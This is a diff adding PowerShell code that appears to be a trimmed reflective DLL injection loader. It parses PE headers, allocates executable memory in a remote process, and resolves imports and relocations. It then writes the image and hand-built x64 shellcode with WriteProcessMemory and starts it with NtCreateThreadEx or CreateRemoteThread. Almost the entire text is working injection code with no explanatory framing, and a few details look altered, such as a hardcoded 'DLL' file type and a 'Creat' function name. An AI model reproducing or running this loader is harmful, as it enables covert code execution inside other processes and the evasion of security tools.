+		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
+		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
+		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
+		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER
+
+		#Struct IMAGE_BASE_RELOCATION
+		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
+		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
+		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION
+
+		#Struct IMAGE_IMPORT_DESCRIPTOR
+		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
+		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
+		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR
+
+		#Struct IMAGE_EXPORT_DIRECTORY
+		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
+		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
+		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
+		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
+		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
+
+		return $Win32Types
+	}
+
+	Function Get-Win32Constants
+	{
+		$Win32Constants = New-Object System.Object
+		
+		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
+		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
+        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
+		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
+		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
+		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
+		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
+		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
+		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
+		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
+		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
+		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
+		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
+		
+		return $Win32Constants
+	}
+    Function Write-BytesToMemory
+	{
+		Param(
+			[Parameter(Position=0, Mandatory = $true)]
+			[Byte[]]
+			$Bytes,
+			
+			[Parameter(Position=1, Mandatory = $true)]
+			[IntPtr]
+			$MemoryAddress
+		)
+	
+		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
+		{
+			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
+		}
+	}
+Function Get-DelegateType
+	{
+	    Param
+	    (
+	        [OutputType([Type])]
+	        
+	        [Parameter( Position = 0)]
+	        [Type[]]
+	        $Parameters = (New-Object Type[](0)),
+	        
+	        [Parameter( Position = 1 )]
+	        [Type]
+	        $ReturnType = [Void]
+	    )
+
+	    $Domain = [AppDomain]::CurrentDomain
+	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
+	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
+	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
+	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
+	    
+	    Write-Output $TypeBuilder.CreateType()
+	}
+
+	Function Get-ProcAddress
+	{
+	    Param
+	    (
+	        [OutputType([IntPtr])]
+	    
+	        [Parameter( Position = 0, Mandatory = $True )]
+	        [String]
+	        $Module,
+	        
+	        [Parameter( Position = 1, Mandatory = $True )]
+	        [String]
+	        $Procedure
+	    )
+
+	   
+	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
+
+        Where-Object { $_.GlobalAssemblyCache -And $_.Location -like '*System.dll' }
+	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
+	    
+	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
+	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
+	    
+	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
+	    $tmpPtr = New-Object IntPtr
+	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
+
+	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
+	}
+	
+	Function Sub-SignedIntAsUnsigned
+	{
+		Param(
+		[Parameter(Position = 0, Mandatory = $true)]
+		[Int64]
+		$Value1,
+		
+		[Parameter(Position = 1, Mandatory = $true)]
+		[Int64]
+		$Value2
+		)
+		
+		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
+		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
+		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)
+
+		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
+		{
+			$CarryOver = 0
+			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
+			{
+				$Val = $Value1Bytes[$i] - $CarryOver
+				#Sub bytes
+				if ($Val -lt $Value2Bytes[$i])
+				{
+					$Val += 256
+					$CarryOver = 1
+				}
+				else
+				{
+					$CarryOver = 0
+				}
+				
+				
+				[UInt16]$Sum = $Val - $Value2Bytes[$i]
+
+				$FinalBytes[$i] = $Sum -band 0x00FF
+			}
+		}
+		else
+		{
+			Throw ""
+		}
+		
+		return [BitConverter]::ToInt64($FinalBytes, 0)
+	}
+	
+	Function Add-SignedIntAsUnsigned
+	{
+		Param(
+		[Parameter(Position = 0, Mandatory = $true)]
+		[Int64]
+		$Value1,
+		
+		[Parameter(Position = 1, Mandatory = $true)]
+		[Int64]
+		$Value2
+		)
+		
+		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
+		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
+		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)
+
+		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
+		{
+			$CarryOver = 0
+			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
+			{
+				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver
+
+				$FinalBytes[$i] = $Sum -band 0x00FF
+				
+				if (($Sum -band 0xFF00) -eq 0x100)
+				{
+					$CarryOver = 1
+				}
+				else
+				{
+					$CarryOver = 0
+				}
+			}
+		}
+		else
+		{
+			Throw ""
+		}
+		
+		return [BitConverter]::ToInt64($FinalBytes, 0)
+	}
+	    Function Compare-Val1GreaterThanVal2AsUInt
+	{
+		Param(
+		[Parameter(Position = 0, Mandatory = $true)]
+		[Int64]
+		$Value1,
+		
+		[Parameter(Position = 1, Mandatory = $true)]
+		[Int64]
+		$Value2
+		)
+		
+		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
+		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
+
+		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
+		{
+			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
+			{
+				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
+				{
+					return $true
+				}
+				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
+				{
+					return $false
+				}
+			}
+		}
+		else
+		{
+			return
+		}
+		
+		return $false
+	}
+
+    Function Get-ImageNtHeaders
+	{
+		Param(
+		[Parameter(Position = 0, Mandatory = $true)]
+		[IntPtr]
+		$PEHandle,
+		
+		[Parameter(Position = 1, Mandatory = $true)]
+		[System.Object]
+		$Win32Types
+		)
+		
+		$NtHeadersInfo = New-Object System.Object
+
+		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)
+
+		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
+		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
+		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
+		
+	    if ($imageNtHeaders64.Signature -ne 0x00004550)
+	    {
+	        return
+	    }
+		
+		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
+		{
+			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
+			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
+		}
+		else
+		{
+			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
+			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
+			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
+		}
+		
+		return $NtHeadersInfo
+	}
+
+	Function Get-PEBasicInfo
+	{
+		Param(
+		[Parameter( Position = 0, Mandatory = $true )]
+		[Byte[]]
+		$PEBytes,
+		
+		[Parameter(Position = 1, Mandatory = $true)]
+		[System.Object]
+		$Win32Types
+		)
+		
+		$PEInfo = New-Object System.Object
+		
+		$gch = [System.Runtime.InteropServices.GCHandle]::Alloc($PEBytes, [System.Runtime.InteropServices.GCHandleType]::Pinned)
+
+        $UnmanagedPEBytes = $gch.AddrOfPinnedObject()
+	
+		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
+		
+		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
+		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
+		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
+		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
+		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
+		
+		$gch.Free()
+		
+		return $PEInfo
+	}
+Function Get-PEDetailedInfo
+	{
+		Param(
+		[Parameter( Position = 0, Mandatory = $true)]
+		[IntPtr]
+		$PEHandle,
+		
+		[Parameter(Position = 1, Mandatory = $true)]
+		[System.Object]
+		$Win32Types,
+		
+		[Parameter(Position = 2, Mandatory = $true)]
+		[System.Object]
+		$Win32Constants
+		)
+		
+		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
+		{
+			return
+		}
+		
+		$PEInfo = New-Object System.Object
+	
+		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
+		
+		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
+		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
+		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
+		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
+		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
+		
+		[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
+		$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
+			
+		$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
+		
+		return $PEInfo
+	}
+    
+    Function Import-DllImports
+	{
+		Param(
+		[Parameter(Position = 0, Mandatory = $true)]
+		[System.Object]
+		$PEInfo,
+		
+		[Parameter(Position = 1, Mandatory = $true)]
+		[System.Object]
+		$Win32Functions,
+		
+		[Parameter(Position = 2, Mandatory = $true)]
+		[System.Object]
+		$Win32Types,
+		
+		[Parameter(Position = 3, Mandatory = $true)]
+		[System.Object]
+		$Win32Constants,
+		
+		[Parameter(Position = 4, Mandatory = $false)]
+		[IntPtr]
+		$RemoteProcHandle
+		)
+		
+		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
+		{
+			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
+			
+			while ($true)
+			{
+				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
+				
+				if ($ImportDescriptor.Characteristics -eq 0 `
+						-and $ImportDescriptor.FirstThunk -eq 0 `
+						-and $ImportDescriptor.ForwarderChain -eq 0 `
+						-and $ImportDescriptor.Name -eq 0 `
+						-and $ImportDescriptor.TimeDateStamp -eq 0)
+				{
+					break
+				}
+
+				$ImportDllHandle = [IntPtr]::Zero
+				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
+				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
+				
+			    $ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
+
+				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
+				{
+			            return
+				}
+				
+				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
+				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) 
+				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
+				
+				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
+				{
+                    $LoadByOrdinal = $false
+                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
+					
+					[IntPtr]$NewThunkRef = [IntPtr]::Zero
+					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
+					{
+						[IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff 
+                        $LoadByOrdinal = $true
+					}
+                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
+					{
+						[IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff 
+                        $LoadByOrdinal = $true
+					}
+					else
+					{
+						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
+						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
+						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
+                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
+					}
+					
+			        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
+					
+					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
+					{
+                       return
+					}
+
+					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
+					
+					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
+					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
+					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
+
+                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
+                    {
+                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
+                        $ProcedureNamePtr = [IntPtr]::Zero
+                    }
+				}
+				
+				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
+			}
+		}
+	}
+
+     Function Invoke-MemoryLoadLibrary
+	{
+		Param(
+		[Parameter( Position = 0, Mandatory = $true )]
+		[Byte[]]
+		$PEBytes,
+		
+		[Parameter(Position = 1, Mandatory = $false)]
+		[String]
+		$ExeArgs,
+		
+		[Parameter(Position = 2, Mandatory = $false)]
+		[IntPtr]
+		$RemoteProcHandle
+		)
+		
+		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
+		
+		$Win32Constants = Get-Win32Constants
+		$Win32Functions = Get-Win32Functions
+		$Win32Types = Get-Win32Types
+
+		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
+		$OriginalImageBase = $PEInfo.OriginalImageBase
+		
+        [IntPtr]$LoadAddr = [IntPtr]::Zero
+		$PEHandle = [IntPtr]::Zero				
+		$EffectivePEHandle = [IntPtr]::Zero
+		
+        $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
+		$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
+		if ($EffectivePEHandle -eq [IntPtr]::Zero)
+		{
+			return
+		}
+		
+		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
+		if ($PEHandle -eq [IntPtr]::Zero)
+		{ 
+			return
+		}		
+		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
+		
+		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
+		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
+		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
+		
+		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
+	
+		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types
+
+		Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
+		
+		[UInt32]$NumBytesWritten = 0
+		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
+		if ($Success -eq $false)
+		{
+			return
+		}
+
+		if ($PEInfo.FileType -ieq "DLL")
+		{
+			
+			$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
+			
+			$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
+			$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
+			$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
+			
+			$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
+			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
+			$SCPSMemOriginal = $SCPSMem
+				
+			Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
+			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
+			[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
+			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
+			Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
+			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
+			[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
+			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
+			Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
+			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
+				
+			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
+			if ($RSCAddr -eq [IntPtr]::Zero)
+			{
+				return
+			}
+				
+			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
+			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
+			{
+				return
+			}
+      
+			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -ArgumentPtr $EffectivePEHandle -Win32Functions $Win32Functions
+		}
+		return @($PEInfo.PEHandle, $EffectivePEHandle)
+	}        
+    Function Create-RemoteThread
+	{
+		Param(
+		[Parameter(Position = 1, Mandatory = $true)]
+		[IntPtr]
+		$ProcessHandle,
+		
+		[Parameter(Position = 2, Mandatory = $true)]
+		[IntPtr]
+		$StartAddress,
+		
+		[Parameter(Position = 3, Mandatory = $false)]
+		[IntPtr]
+		$ArgumentPtr = [IntPtr]::Zero,
+		
+		[Parameter(Position = 4, Mandatory = $true)]
+		[System.Object]
+		$Win32Functions
+		)
+		
+		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
+		
+		$OSVersion = [Environment]::OSVersion.Version
+
+
+		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
+		{
+			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
+			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
+			{
+				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
+			}
+		}
+		
+		else
+		{
+			$RemoteThreadHandle = $Win32Functions.Creat.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
+            
+		}
+		return $RemoteThreadHandle
+	}
+Function Update-MemoryAddresses
+	{
+		Param(
+		[Parameter(Position = 0, Mandatory = $true)]
+		[System.Object]
+		$PEInfo,
+		
+		[Parameter(Position = 1, Mandatory = $true)]
+		[Int64]
+		$OriginalImageBase,
+		
+		[Parameter(Position = 2, Mandatory = $true)]
+		[System.Object]
+		$Win32Constants,
+		
+		[Parameter(Position = 3, Mandatory = $true)]
+		[System.Object]
+		$Win32Types
+		)
+		
+		[Int64]$BaseDifference = 0
+		$AddDifference = $true 
+		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
+		
+		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
+				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
+		{
+			return
+		}elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
+		{
+			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
+			$AddDifference = $false
+		}
+		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
+		{
+			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
+		}
+	
+		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
+		while($true)
+		{
+			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)
+
+			if ($BaseRelocationTable.SizeOfBlock -eq 0)
+			{
+				break
+			}
